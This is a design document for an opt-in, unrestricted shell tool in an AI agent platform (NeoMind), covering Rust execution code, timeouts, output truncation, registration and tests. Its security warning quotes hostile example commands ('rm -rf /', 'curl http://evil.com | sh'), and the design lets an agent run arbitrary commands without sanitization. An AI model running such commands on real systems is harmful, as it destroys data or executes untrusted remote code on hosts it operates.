# Agent Shell Tool Design

## Overview

Add a `shell` tool to the NeoMind AI Agent, enabling it to execute arbitrary system commands via the existing Tool trait interface. The tool supports both interactive (user-driven chat) and automated (rule-triggered, scheduled) execution scenarios.

Key motivation: The agent currently operates solely through NeoMind platform APIs (device, agent, rule, message, extension tools). It cannot perform system-level operations such as LAN device discovery (`arp`, `nmap`, `avahi-browse`), service diagnostics (`systemctl`, `journalctl`, `docker`), or general command execution (`curl`, `ping`). This limits the agent's usefulness in edge IoT scenarios where on-site SSH access may not be available.

## Requirements

- **R1**: Agent can execute arbitrary shell commands and receive stdout, stderr, and exit code.
- **R2**: Shell tool is opt-in per agent via configuration (`enabled` flag).
- **R3**: Commands have configurable timeout (default 30s) to prevent hanging.
- **R4**: Command output is truncated to a configurable max length (default 10000 chars) to prevent token explosion.
- **R5**: Works in both interactive chat sessions and automated execution flows.
- **R6**: All command executions are logged in agent execution history.

## Security Model

The tool operates in **unrestricted mode** (no whitelist/blacklist). Rationale:

1. IoT edge scenarios require diverse network commands (`arp`, `nmap`, `avahi-browse`, `bluetoothctl`, `snmpwalk`) that are impractical to enumerate in a whitelist.
2. Pipeline compositions (`arp -a | grep -i vendor`) make prefix-based whitelisting fragile.
3. The tool is **opt-in** — disabled by default. Administrators must explicitly enable it per agent.
4. The NeoMind platform runs on controlled edge hardware where the operator owns the system.

Guardrails retained:
- **Timeout**: Commands are killed after configurable duration (default 30s, max 600s).
- **Output truncation**: Prevents token explosion from verbose commands.
- **Opt-in**: Shell tool is not registered unless explicitly enabled in agent config.
- **Execution logging**: All commands recorded in agent execution history for audit.
- **Stateless**: Each command runs in a separate process — no persistent shell state.

**WARNING**: This tool provides ZERO command sanitization. All shell metacharacters are interpreted by `/bin/sh -c`. Commands like `rm -rf /`, `curl http://evil.com | sh`, or `$(malicious_command)` will execute exactly as written. Only enable this tool in trusted environments where users understand the risks.

## Architecture

```
Agent Config (agent_store)
  └─ shell.enabled: bool
  └─ shell.timeout_secs: u64
  └─ shell.max_output_chars: usize
        │
        ▼
ShellTool (impl Tool)
  name: "shell"
  parameters: { command, timeout?, working_dir? }
        │
        ▼
tokio::process::Command
  /bin/sh -c "{command}"
  capture stdout + stderr
  timeout → kill process group
  truncate output → ToolOutput
```

## Data Model

### ShellConfig

```rust
/// Shell tool configuration, stored as part of agent config.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ShellConfig {
    /// Whether shell tool is enabled for this agent. Default: false.
    #[serde(default)]
    pub enabled: bool,

    /// Maximum execution time per command in seconds. Default: 30.
    #[serde(default = "default_timeout")]
    pub timeout_secs: u64,

    /// Maximum output characters (stdout + stderr combined). Default: 10000.
    #[serde(default = "default_max_output")]
    pub max_output_chars: usize,
}
```

Default values:
- `enabled`: `false` (opt-in)
- `timeout_secs`: `30`
- `max_output_chars`: `10000`

### Tool Parameters (JSON Schema)

```json
{
  "type": "object",
  "properties": {
    "command": {
      "type": "string",
      "description": "The shell command to execute"
    },
    "timeout": {
      "type": "number",
      "description": "Optional per-command timeout in seconds (overrides default)"
    },
    "working_dir": {
      "type": "string",
      "description": "Optional working directory for command execution"
    }
  },
  "required": ["command"]
}
```

### Tool Output (ToolOutput.data)

```json
{
  "exit_code": 0,
  "stdout": "command output here...",
  "stderr": "",
  "command": "the executed command",
  "timed_out": false
}
```

Fields:
- `exit_code`: Process exit code (`null` if killed by signal or timeout).
- `stdout`: Captured standard output (truncated if exceeds max_output_chars).
- `stderr`: Captured standard error (truncated).
- `command`: Echo of the executed command string.
- `timed_out`: `true` if the command was killed due to timeout.

## Execution Flow

```
1. LLM generates tool call: { "name": "shell", "args": { "command": "arp -a" } }
2. StreamingAgent detects tool call, routes to ToolRegistry
3. ToolRegistry executes ShellTool::execute(args)
4. ShellTool:
   a. Extract command string from args
   b. Resolve timeout (per-command override or config default)
   c. Spawn: tokio::process::Command::new("/bin/sh")
        .arg("-c")
        .arg(&command)
        .current_dir(working_dir if provided)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .process_group(0)  // new process group for clean kill
   d. Await with timeout: tokio::time::timeout(...)
   e. On timeout: kill process group (SIGKILL)
   f. Read stdout + stderr
   g. Truncate output if exceeds max_output_chars
   h. Return ToolOutput { success, data, error, metadata }
5. StreamingAgent formats result for LLM consumption
6. LLM continues reasoning with command output
```

## File Changes

### New Files

| File | Description |
|------|-------------|
| `crates/neomind-agent/src/toolkit/shell.rs` | ShellTool implementation (ShellConfig + Tool trait impl) |

### Modified Files

| File | Change |
|------|--------|
| `crates/neomind-agent/src/toolkit/mod.rs` | Add `pub mod shell;` |
| `crates/neomind-agent/src/toolkit/registry.rs` | Add `with_shell_tool(config)` to `ToolRegistryBuilder` |
| `crates/neomind-agent/src/agent/streaming.rs` | Add shell tool result formatting in `format_aggregated_tool_result()` |
| `crates/neomind-agent/Cargo.toml` | Add `nix` dependency for process group kill |
| `crates/neomind-storage/src/agents.rs` | Add `shell: Option<ShellConfig>` to `AgentToolConfig` |
| `crates/neomind-api/src/handlers/sessions.rs` | Read shell config from agent's `tool_config` and pass to tool builder |

### Frontend (Optional, Phase 2)

| File | Change |
|------|--------|
| `web/src/types/shell.ts` | **New** — TypeScript `ShellConfig` interface |
| `web/src/pages/agents.tsx` | Shell config toggle in agent settings |
| `web/src/i18n/locales/en/agents.json` | Shell config labels |
| `web/src/i18n/locales/zh/agents.json` | Shell config labels |

## ShellTool Implementation Details

### Command Execution

```rust
async fn execute_command(
    command: &str,
    working_dir: Option<&str>,
    timeout: Duration,
) -> Result<CommandOutput> {
    let mut cmd = Command::new("/bin/sh");
    cmd.arg("-c")
       .arg(command)
       .stdout(Stdio::piped())
       .stderr(Stdio::piped())
       .process_group(0);  // isolate process group for clean kill

    if let Some(dir) = working_dir {
        let path = std::path::Path::new(dir);
        if !path.exists() {
            return Err(ToolError::Execution(format!("Working directory does not exist: {}", dir)));
        }
        if !path.is_dir() {
            return Err(ToolError::Execution(format!("Path is not a directory: {}", dir)));
        }
        cmd.current_dir(dir);
    }

    let mut child = cmd.spawn()
        .map_err(|e| ToolError::Execution(format!("Failed to spawn: {}", e)))?;

    let result = tokio::time::timeout(timeout, child.wait_with_output()).await;

    match result {
        Ok(Ok(output)) => Ok(CommandOutput {
            exit_code: output.status.code(),
            stdout: String::from_utf8_lossy(&output.stdout).into_owned(),
            stderr: String::from_utf8_lossy(&output.stderr).into_owned(),
            timed_out: false,
        }),
        Ok(Err(e)) => Err(ToolError::Execution(format!("Execution failed: {}", e))),
        Err(_) => {
            // Timeout — kill entire process group (kills child processes too)
            kill_process_group(&mut child);
            // Reap the child process
            let _ = child.wait().await;
            Ok(CommandOutput {
                exit_code: None,
                stdout: String::new(),
                stderr: format!("Command timed out after {}s", timeout.as_secs()),
                timed_out: true,
            })
        }
    }
}

/// Kill the entire process group to prevent orphaned child processes.
fn kill_process_group(child: &mut tokio::process::Child) {
    if let Some(pid) = child.id() {
        // PID of child is also the PGID since we used process_group(0)
        unsafe {
            libc::killpg(pid as i32, libc::SIGKILL);
        }
    }
}
```

Timeout validation (in `ShellTool::execute`):
```rust
// Cap per-command timeout at 600 seconds (10 minutes)
let timeout = if let Some(user_timeout) = args.get("timeout") {
    let secs = user_timeout.as_u64()
        .ok_or_else(|| ToolError::InvalidArguments("timeout must be a positive number".into()))?;
    Duration::from_secs(secs.min(600))
} else {
    Duration::from_secs(self.config.timeout_secs)
};
```

### Output Truncation

```rust
fn truncate_output(stdout: &str, stderr: &str, max_total: usize) -> (String, String) {
    let stdout_len = stdout.len();
    let stderr_len = stderr.len();

    if stdout_len + stderr_len <= max_total {
        return (stdout.to_string(), stderr.to_string());
    }

    // Reserve space for truncation notices (~60 chars each)
    const NOTICE_LEN: usize = 60;
    let usable = max_total.saturating_sub(NOTICE_LEN * 2);

    // Allocate proportional shares
    let total = stdout_len + stderr_len;
    let stdout_budget = (usable * stdout_len / total).min(stdout_len);
    let stderr_budget = (usable * stderr_len / total).min(stderr_len);

    let truncated_stdout = if stdout_len > stdout_budget {
        format!("{}\n... [truncated, {} chars omitted]", &stdout[..stdout_budget], stdout_len - stdout_budget)
    } else {
        stdout.to_string()
    };

    let truncated_stderr = if stderr_len > stderr_budget {
        format!("{}\n... [truncated, {} chars omitted]", &stderr[..stderr_budget], stderr_len - stderr_budget)
    } else {
        stderr.to_string()
    };

    (truncated_stdout, truncated_stderr)
}
```

### Tool Description (LLM-facing)

```
Execute shell commands on the system.

Use this tool to:
- Network diagnostics: ping, traceroute, curl, arp, nmap
- System monitoring: ps, df, free, top, uptime, systemctl status
- File inspection: ls, cat, head, tail, grep, find, wc
- Device discovery: arp-scan, avahi-browse, bluetoothctl
- Container management: docker ps, docker logs
- Any other system command available on the host

Parameters:
- command (required): The shell command to execute
- timeout (optional): Per-command timeout in seconds (default: 30)
- working_dir (optional): Working directory for execution

Returns: exit_code, stdout, stderr, timed_out flag.
Commands run in /bin/sh -c. Output may be truncated for very long responses.
```

## Integration Points

### 1. Tool Registration

In `ToolRegistryBuilder::with_shell_tool()`:
```rust
pub fn with_shell_tool(mut self, config: Option<ShellConfig>) -> Self {
    if let Some(shell_config) = config {
        if shell_config.enabled {
            self.registry.register(Arc::new(ShellTool::new(shell_config)));
        }
    }
    self
}
```

The tool is only registered when config is `Some` and `enabled: true`. Agents without shell config or with `enabled: false` will not have the tool available.

### 2. Agent Session Creation

In session creation (API handler), read shell config from agent's `tool_config` in agent store and pass to tool builder:
```rust
let shell_config = agent.tool_config.shell.clone();
let builder = ToolRegistryBuilder::new()
    .with_aggregated_tools_full(...)
    .with_shell_tool(shell_config);
```

### 3. Streaming Result Formatting

Add shell result formatting to `format_aggregated_tool_result()`:
```rust
"shell" => {
    response.push_str(&format!("## Shell: `{}`\n", json["command"].as_str().unwrap_or("?")));
    if json.get("timed_out").and_then(|t| t.as_bool()).unwrap_or(false) {
        response.push_str("**Timed out**\n");
    }
    if let Some(stdout) = json.get("stdout").and_then(|s| s.as_str()) {
        if !stdout.is_empty() {
            response.push_str(&format!("```\n{}\n```\n", stdout));
        }
    }
    if let Some(stderr) = json.get("stderr").and_then(|s| s.as_str()) {
        if !stderr.is_empty() {
            response.push_str(&format!("**stderr:**\n```\n{}\n```\n", stderr));
        }
    }
}
```

## LAN Device Discovery Scenarios

With the shell tool, the agent can perform:

| Scenario | Command | Example User Query |
|----------|---------|-------------------|
| ARP table scan | `arp -a` | "What devices are on my network?" |
| Subnet host discovery | `nmap -sn 192.168.1.0/24` | "Scan my LAN for devices" |
| mDNS service discovery | `avahi-browse -al` | "Find Bonjour/mDNS devices" |
| Bluetooth LE scan | `bluetoothctl -- scan on` | "Discover nearby BLE devices" |
| Network interfaces | `ip addr show` | "Show network interfaces" |
| Active connections | `ss -tulnp` | "What services are listening?" |
| HTTP device probe | `curl -s http://192.168.1.50/api/info` | "Check what this device is" |
| SNMP query | `snmpwalk -v2c -c public 192.168.1.1` | "Query this SNMP device" |
| DNS discovery | `dig +short thermostat.local` | "Find device by mDNS name" |

## Testing Strategy

### Unit Tests

1. **Command execution**: Basic commands (`echo hello`, `ls /tmp`) produce correct stdout/exit_code.
2. **Timeout**: Long-running commands (`sleep 60`) are killed within timeout + grace period.
3. **Timeout validation**: Per-command timeout capped at 600s, negative values rejected.
4. **Output truncation**: Commands producing > max_output_chars are truncated correctly (accounting for truncation notice overhead).
5. **Working directory**: Commands execute in specified working_dir; non-existent/invalid paths return clear errors.
6. **Stderr capture**: Commands that write to stderr capture it correctly.
7. **Process group kill**: On timeout, child processes are also killed — spawn `sh -c 'sleep 10 &'` with short timeout, verify `timed_out: true`.
8. **Disabled by default**: ShellTool not registered when config is `None` or `enabled: false`.

### Integration Tests

1. **Tool registration**: ShellTool registered when config `enabled: true`, absent when `false` or `None`.
2. **End-to-end**: Agent receives shell tool call → executes → returns formatted result.
3. **LAN discovery simulation**: Agent executes `ping -c 1 127.0.0.1` and processes result.

## Future Considerations

1. **Remote device execution**: Extend with SSH target (`ssh user@host "command"`) — shell tool already supports this since any command can run.
2. **Session persistence**: If stateful shell sessions are needed (cross-call `cd`, `export`), can add session management in a future iteration.
3. **Frontend UI**: Agent settings page with shell toggle, timeout, and max output configuration.
4. **Audit trail**: Enhanced logging of all shell executions with timestamp, user, and full output (before truncation).
